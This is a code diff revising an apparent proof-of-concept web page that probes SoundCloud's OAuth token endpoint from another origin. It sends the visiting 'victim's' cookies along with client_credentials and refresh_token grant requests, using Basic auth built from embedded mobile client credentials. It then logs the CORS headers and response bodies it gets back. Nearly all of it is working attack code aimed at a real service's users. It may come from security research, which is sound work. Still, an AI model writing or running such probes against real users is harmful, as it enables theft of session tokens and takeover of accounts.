@@ -95,20 +95,10 @@
             log("", "");
             var results = [];
 
-            // 1. POST client_credentials to secure.soundcloud.com (victim's cookies sent along)
-            log("--- Test 1: POST client_credentials with victim cookies ---", "info");
-            var r1 = await tryPost(
-                "https://secure.soundcloud.com/oauth/token",
-                "grant_type=client_credentials&client_id=" + MOBILE_ID + "&client_secret=" + MOBILE_SECRET,
-                "secure.sc - client_credentials"
-            );
-            results.push(r1);
-
-            // 2. POST client_credentials with Basic auth header
-            log("", "");
-            log("--- Test 2: POST with Basic auth ---", "info");
+            // 1. POST client_credentials with Basic auth (prevents browser auth dialog)
+            log("--- Test 1: POST client_credentials with Basic auth + victim cookies ---", "info");
             try {
-                var resp2 = await fetch("https://secure.soundcloud.com/oauth/token", {
+                var resp1 = await fetch("https://secure.soundcloud.com/oauth/token", {
                     method: "POST",
                     credentials: "include",
                     headers: {
@@ -117,36 +107,38 @@
                     },
                     body: "grant_type=client_credentials"
                 });
-                var acao2 = resp2.headers.get("access-control-allow-origin");
-                var text2 = await resp2.text();
-                log("  Status: " + resp2.status, resp2.ok ? "success" : "info");
-                log("  ACAO: " + acao2, acao2 ? "success" : "fail");
-                log("  Body: " + text2.substring(0, 500), text2.length > 2 ? "success" : "info");
-                results.push({ name: "secure.sc - Basic auth", value: "Status: " + resp2.status + " | ACAO: " + acao2 + " | Body: " + text2.substring(0, 500) });
+                var acao1 = resp1.headers.get("access-control-allow-origin");
+                var text1 = await resp1.text();
+                log("  Status: " + resp1.status, resp1.ok ? "success" : "info");
+                log("  ACAO: " + acao1, acao1 ? "success" : "fail");
+                log("  Body: " + text1.substring(0, 500), text1.length > 2 ? "success" : "info");
+                results.push({ name: "client_credentials + cookies", value: "Status: " + resp1.status + " | ACAO: " + acao1 + " | Body: " + text1.substring(0, 500) });
             } catch(e) {
                 log("  Error: " + e.message, "fail");
-                results.push({ name: "secure.sc - Basic auth", value: "Error: " + e.message });
+                results.push({ name: "client_credentials + cookies", value: "Error: " + e.message });
             }
 
-            // 3. POST refresh_token grant (if victim has a refresh token cookie)
+            // 2. POST refresh_token grant with Basic auth
             log("", "");
-            log("--- Test 3: POST refresh_token grant ---", "info");
-            var r3 = await tryPost(
-                "https://secure.soundcloud.com/oauth/token",
-                "grant_type=refresh_token&client_id=" + MOBILE_ID + "&client_secret=" + MOBILE_SECRET + "&refresh_token=dummy",
-                "secure.sc - refresh_token"
-            );
-            results.push(r3);
-
-            // 4. POST to /oauth/token with password grant (victim cookies = maybe session)
-            log("", "");
-            log("--- Test 4: POST password grant (testing if cookies auto-auth) ---", "info");
-            var r4 = await tryPost(
-                "https://secure.soundcloud.com/oauth/token",
-                "grant_type=password&client_id=" + MOBILE_ID + "&client_secret=" + MOBILE_SECRET,
-                "secure.sc - password grant"
-            );
-            results.push(r4);
+            log("--- Test 2: POST refresh_token grant ---", "info");
+            try {
+                var resp3 = await fetch("https://secure.soundcloud.com/oauth/token", {
+                    method: "POST",
+                    credentials: "include",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Authorization": "Basic " + btoa(MOBILE_ID + ":" + MOBILE_SECRET)
+                    },
+                    body: "grant_type=refresh_token&refresh_token=dummy"
+                });
+                var text3 = await resp3.text();
+                log("  Status: " + resp3.status, "info");
+                log("  Body: " + text3.substring(0, 500), "info");
+                results.push({ name: "refresh_token grant", value: "Status: " + resp3.status + " | " + text3.substring(0, 500) });
+            } catch(e) {
+                log("  Error: " + e.message, "fail");
+                results.push({ name: "refresh_token grant", value: "Error: " + e.message });
+            }
 
             // 5. Try GET on api-auth/oauth/session (this one might reflect *.soundcloud.com only)
             log("", "");
